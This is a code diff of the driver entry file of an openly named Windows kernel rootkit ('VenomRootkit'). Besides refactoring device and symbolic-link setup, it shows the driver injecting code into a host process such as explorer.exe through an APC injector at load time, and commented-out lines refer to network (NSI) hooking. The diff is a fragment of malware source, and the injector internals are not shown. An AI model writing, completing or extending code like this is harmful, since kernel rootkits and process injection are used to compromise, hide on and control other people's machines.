@@ -1,33 +1,29 @@
-//#include "UMInjectionHandler.h"
+#include "Config.h"
 #include "Capabilities/InjectionCapabilities/APCInjector.h"
-#include "Venom.h"
 #include "IoctlHandlers.h"
 #include "Ioctl.h"
 #include "NetworkHandler.h"
+#include "Venom.h"
 
-//EX_RUNDOWN_REF ApcHandler::g_rundown_protection;
-
-extern "C" NTSTATUS
+EXTERN_C NTSTATUS
 DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
 	UNREFERENCED_PARAMETER(RegistryPath);
 
 	auto status = STATUS_SUCCESS;
-	PDEVICE_OBJECT DeviceObject = nullptr;
+	PDEVICE_OBJECT deviceObject = nullptr;
 	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\VenomRootkit");
 
 	bool symLinkCreated = false;
 	do
 	{
-		UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\VenomRootkit");
-		status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
+		UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\VenomRootkit");
+		status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &deviceObject);
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "failed to create device (0x%08X)\n", status));
 			break;
 		}
 
-		status = IoCreateSymbolicLink(&symLink, &devName);
+		status = IoCreateSymbolicLink(&symLink, &deviceName);
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "failed to create sym link (0x%08X)\n", status));
 			break;
 		}
 		symLinkCreated = true;
@@ -35,10 +31,12 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	} while (false);
 
 	if (!NT_SUCCESS(status)) {
-		if (symLinkCreated)
+		if (symLinkCreated) {
 			IoDeleteSymbolicLink(&symLink);
-		if (DeviceObject)
-			IoDeleteDevice(DeviceObject);
+		}
+		if (deviceObject) {
+			IoDeleteDevice(deviceObject);
+		}
 	}
 
 	DriverObject->DriverUnload = VenomUnload;
@@ -51,15 +49,12 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	//}
 
 	// Inject user mode dll to explorer.exe
-	UNICODE_STRING processName = RTL_CONSTANT_STRING(L"explorer.exe");
-	//HANDLE pid = UMInjectionHandler::getProcessId(ProcessName);
-	auto shellcode = NonPagedBuffer(30);
-	auto process = Process(processName);
-	auto apcInjector = APCInjector(process, shellcode);
-	//::ExInitializeRundownProtection(&ApcHandler::g_rundown_protection);
+	//UNICODE_STRING processName = RTL_CONSTANT_STRING(L"explorer.exe");
+	auto process = Process(VENOM_HOST_PROCESS);
+	auto apcInjector = APCInjector(process);
 
 	status = apcInjector.inject();
-	//status = UMInjectionHandler::injectDll(HandleToUlong(pid));
+
 	if (!NT_SUCCESS(status)) {
 		return status;
 	}
@@ -121,6 +116,4 @@ void VenomUnload(PDRIVER_OBJECT DriverObject)
 	//{
 	//	DbgPrint("Couldn't unhook NSI");
 	//}
-
-	//::ExWaitForRundownProtectionRelease(&ApcHandler::g_rundown_protection);
 }
